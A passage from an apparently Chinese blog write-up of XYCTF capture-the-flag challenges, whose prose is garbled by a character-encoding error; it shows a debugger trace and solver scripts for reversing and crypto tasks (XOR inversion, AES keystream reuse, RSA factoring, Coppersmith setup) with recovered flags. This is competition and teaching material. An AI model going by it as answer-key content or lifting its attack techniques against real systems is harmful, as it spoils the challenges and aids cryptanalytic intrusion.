sub_558B201D1400RAX=0000558B201D1400</span><br><span class="line">0000E808.text:enc+60mov     [rsp+48h+var_28], rax</span><br><span class="line">0000E808.text:enc+65lea     rax, loc_558B201D13E0RAX=0000558B201D13E0</span><br><span class="line">0000E808.text:enc+6Cmov     [rsp+48h+var_20], rax</span><br><span class="line">0000E808.text:enc+71lea     eax, [rdx-1]RAX=0000000000000001</span><br><span class="line">0000E808.text:enc+74jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1460endbr64</span><br><span class="line">0000E808.text:sub_558B201D1460+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1448</span><br><span class="line">0000E808.text:sub_558B201D1460+8add     edx, 1RDX=0000000000000003 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1460+Bmov     r8d, ediR8=000000000000004D</span><br><span class="line">0000E808.text:sub_558B201D1460+Elea     eax, [rdx-1]RAX=0000000000000002</span><br><span class="line">0000E808.text:sub_558B201D1460+11jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1448endbr64</span><br><span class="line">0000E808.text:sub_558B201D1448+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1430</span><br><span class="line">0000E808.text:sub_558B201D1448+8xor     r8d, esiR8=000000000000004A PF=0</span><br><span class="line">0000E808.text:sub_558B201D1448+Badd     edx, 1RDX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1448+Exor     r8d, 66hR8=000000000000002C</span><br><span class="line">0000E808.text:sub_558B201D1448+12lea     eax, [rdx-1]RAX=0000000000000003</span><br><span class="line">0000E808.text:sub_558B201D1448+15jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1430endbr64</span><br><span class="line">0000E808.text:sub_558B201D1430+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1418</span><br><span class="line">0000E808.text:sub_558B201D1430+8add     edx, 1RDX=0000000000000005 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1430+Bsub     r8d, 6R8=0000000000000026 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1430+Flea     eax, [rdx-1]RAX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1430+12jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1418endbr64</span><br><span class="line">0000E808.text:sub_558B201D1418+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1400</span><br><span class="line">0000E808.text:sub_558B201D1418+8add     edx, 1RDX=0000000000000006 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1418+Bmovzx   r9d, byte ptr [r11+r10]R9=000000000000005F</span><br><span class="line">0000E808.text:sub_558B201D1418+10lea     eax, [rdx-1]RAX=0000000000000005</span><br><span class="line">0000E808.text:sub_558B201D1418+13jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1400endbr64</span><br><span class="line">0000E808.text:sub_558B201D1400+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D13E0</span><br><span class="line">0000E808.text:sub_558B201D1400+8add     edx, 1RDX=0000000000000007 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1400+Bxor     r8d, r9dR8=0000000000000079</span><br><span class="line">0000E808.text:sub_558B201D1400+Elea     eax, [rdx-1]RAX=0000000000000006</span><br><span class="line">0000E808.text:sub_558B201D1400+11jmp     rcx</span><br><span class="line">0000E808.text:loc_558B201D13E0endbr64</span><br><span class="line">0000E808.text:0000558B201D13E4mov     rax, [rsp+38h]RAX=374B368125068200</span><br><span class="line">0000E808.text:0000558B201D13E9sub     rax, fs:28hRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:0000558B201D13F2jnz     short loc_558B201D1473</span><br><span class="line">0000E808.text:0000558B201D13F4mov     eax, r8dRAX=0000000000000079</span><br><span class="line">0000E808.text:0000558B201D13F7add     rsp, 48hRSP=00007FFCB17CE168 PF=0 ZF=0</span><br><span class="line">0000E808.text:0000558B201D13FBretnRSP=00007FFCB17CE170</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inp[i]^=(i+6)^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br></pre></td></tr></table></figure><p>é‚£ç›´æ¥é€†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x32</span>, <span class="number">0x98</span>, <span class="number">0x20</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x6C</span>, <span class="number">0x30</span>, <span class="number">0x46</span>, <span class="number">0x66</span>, <span class="number">0x4F</span>, <span class="number">0x5D</span>, <span class="number">0x03</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x68</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x7A</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x09</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># inp[i]^=i^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br><span class="line">key = <span class="string">&quot;i_have_get_shell_but_where_is_you_my_dear_baby!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]^=<span class="built_in">ord</span>(key[i])</span><br><span class="line">    last[i]+=<span class="number">6</span></span><br><span class="line">    last[i]^=(<span class="number">6</span>+i)^<span class="number">0x66</span></span><br><span class="line">        </span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># flag&#123;Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T&#125;</span></span><br></pre></td></tr></table></figure><h4 id="èˆ”ç‹—å››éƒ¨æ›²â€“æˆ‘çš„ç™½æœˆå…‰">èˆ”ç‹—å››éƒ¨æ›²â€“æˆ‘çš„ç™½æœˆå…‰</h4><p>ä¸€å¼€å¤´ç»™äº†flag{L0v3_</p><p>ç„¶ååˆ†æä¸€ä¸‹ä¸»å‡½æ•°ï¼Œå‘ç°æœ€åæœ‰ä¸€ä¸ªbase64ï¼Œæ‹¿å»è§£ä¸€ä¸‹ï¼Œå‘ç°è§£ä¸å‡ºæ¥ï¼Œç„¶åå°è¯•ä¸€ä¸‹æ˜¯ä¸æ˜¯åå‘äº†ä»€ä¹ˆçš„</p><p>åœ¨cyberchefé‡Œé¢ç›´æ¥</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">reverse</span>+<span class="keyword">from</span> base64+<span class="built_in">reverse</span>+<span class="keyword">from</span> hex</span><br><span class="line">å¾—åˆ°</span><br><span class="line"><span class="variable">_memory_never_go_done_finally_thankyou_xiaowangtongxue</span>&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†çœ‹ä¸€ä¸‹ä¸­é—´è¿˜å¹²äº†ä»€ä¹ˆ</p><p>çœ‹åˆ°æœ‰ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(_DWORD)v22 )</span><br><span class="line">&#123;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect(v11, <span class="number">8u</span>i64, <span class="number">4u</span>, flOldProtect);</span><br><span class="line">  *v11 = sub_7FF64A841470;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªsubå¥½åƒå¾ˆå¯ç–‘ï¼Œç›´æ¥set ip è¿‡å»ï¼Œåœ¨æ‰§è¡Œå®Œå‡½æ•°åï¼Œåœ¨å¯¹åº”çš„hexçª—å£æ‰¾åˆ°</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i8_<span class="built_in">a_k3y</span>_and</span><br></pre></td></tr></table></figure><p>æœ€å</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L0v3_i8_<span class="built_in">a_k3y</span>_and_memory_never_go_done_finally_thankyou_xiaowangtongxue&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto">crypto</h2><h3 id="week1-2">week1</h3><h4 id="Sign1n">Sign1n</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">b&#x27;XYCTF&#123;108376aa-c3ed-4e02-a915-47d9ea406612&#125;&#x27;</span></span><br><span class="line">flag=bytes_to_long(flag)</span><br><span class="line">leak=<span class="built_in">bin</span>(<span class="built_in">int</span>(flag))</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    leak += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(leak) == <span class="number">514</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line">input_str = leak</span><br><span class="line">result = swap_bits(input_str)</span><br><span class="line">a=result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) + i + <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_str = a</span><br><span class="line">result = custom_add(input_str)</span><br><span class="line">b=result</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment">#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯å¯¹æ¯ä¸€ä½çš„å•ç‹¬åŠ å¯†ï¼Œé‚£å°±ç›´æ¥çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">llll   = <span class="number">12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567790113445679902334677900134557889122356678001344567801223566790013355689912235667901134457889023355788001344578891133467799012455778012235578800134456899022346779011344567991223557880012346788902335667900134456899122355788001245578891133566780013445678012235577801123557889112456678011245578801233467789112355779912234577990233556780113</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(<span class="built_in">str</span>(input_str))</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (input_list[i] == <span class="built_in">str</span>((k + i + <span class="number">1</span>) % <span class="number">10</span>)):</span><br><span class="line">                res+=(<span class="built_in">str</span>(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">nex = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(out(llll)))</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">nex = <span class="string">&#x27;0b&#x27;</span>+nex[:<span class="number">343</span>]</span><br><span class="line"><span class="comment"># print(nex)</span></span><br><span class="line">y = <span class="built_in">int</span>(nex,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(y))</span><br><span class="line"><span class="comment"># XYCTF&#123;f94e8256-6368-47bc-9ae3-c73e382376d7&#125;</span></span><br></pre></td></tr></table></figure><h4 id="x0r">x0r</h4><p>æ˜¯AESçš„é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œç”±äºæ˜¯å¼‚æˆ–å¾—åˆ°ç»“æœï¼Œé‚£å°±å¯ä»¥ç›´æ¥æˆªè·æ¯ä¸€æ¬¡çš„å¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†é’¥å—</span></span><br><span class="line"><span class="comment"># è¾“å…¥1åå¾—åˆ°çš„å‰32ä¸ªå­—ç¬¦å’Œå96ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment"># è¾“å…¥2åè¾“å…¥å‰32ä¸ªå­—ç¬¦ï¼Œç„¶åè¾“å…¥000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"># å¾—åˆ°çš„è¾“å‡ºæ”¾åˆ°è¿™é‡Œ</span></span><br><span class="line">key_blocks_hex = <span class="string">&#x27;69d174fb2dd82fc3ad184efde51b3a6673027ef1d3a49dbf955d2f62759b1a5924381fb190dd70c5957c7e395311272c&#x27;</span></span><br><span class="line">key_blocks = <span class="built_in">bytes</span>.fromhex(key_blocks_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†æ–‡</span></span><br><span class="line"><span class="comment"># è¾“å…¥1åå¾—åˆ°çš„å‰32ä¸ªå­—ç¬¦å’Œå96ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment"># æ”¾å96ä¸ªå­—ç¬¦</span></span><br><span class="line">ciphertext_hex = <span class="string">&#x27;318837af6ba319a69b7d78c9d67d175e11644bdce7c0ab88b83c1f0642b6783c175929d5a7be12a0f11f033357152328&#x27;</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">plaintext = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), AES.block_size):</span><br><span class="line">    key_block = key_blocks[i:i+AES.block_size]</span><br><span class="line">    ciphertext_block = ciphertext[i:i+AES.block_size]</span><br><span class="line">    plaintext_block = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_block, key_block))</span><br><span class="line">    plaintext += plaintext_block</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="happy-to-solve1">happy_to_solve1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p, q = get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“qæ˜¯på¼‚æˆ–11111â€¦çš„ç»“æœï¼Œé‚£ä¹ˆp+qå°±çº¦ç­‰äº2**512</p><p>æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªå’Œpqä¹˜ç§¯ä¸¤ä¸ªç­‰å¼å°è¯•å¯»æ‰¾på’Œq</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">suma, mula</span>):</span><br><span class="line">    <span class="comment"># è®¾ç½®ç²¾åº¦</span></span><br><span class="line">    getcontext().prec = <span class="number">200</span></span><br><span class="line">    <span class="comment"># è®¡ç®—åˆ¤åˆ«å¼</span></span><br><span class="line">    discriminant = Decimal(suma**<span class="number">2</span> - <span class="number">4</span>*mula).sqrt()</span><br><span class="line">    <span class="comment"># è®¡ç®— p å’Œ q çš„å€¼</span></span><br><span class="line">    p = (suma + discriminant) / <span class="number">2</span></span><br><span class="line">    q = (suma - discriminant) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•</span></span><br><span class="line">suma = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">512</span>)-<span class="number">1</span></span><br><span class="line">mula = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">n=<span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line"></span><br><span class="line">p, q = solve_pq(suma, mula)</span><br><span class="line"><span class="comment"># print(f&quot;p = &#123;Decimal(p):.2f&#125;, q = &#123;Decimal(q):.2f&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(sympy.nextprime(p))</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>((n%p)!=<span class="number">0</span>):</span><br><span class="line">        p = sympy.nextprime(p)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># XYCTF&#123;3f22f4efe3bbbc71bbcc999a0a622a1a23303cdc&#125;</span></span><br></pre></td></tr></table></figure><h4 id="åæ–¹å‘çš„å¯†ç -ç›¸æ€">åæ–¹å‘çš„å¯†ç  ç›¸æ€</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(x.encode()).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message + <span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"><span class="comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå·²çŸ¥mä½ä½ï¼Œç”¨Coppersmithå®šç†å¯è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">n = <span class="number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span></span><br><span class="line">c = <span class="number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span 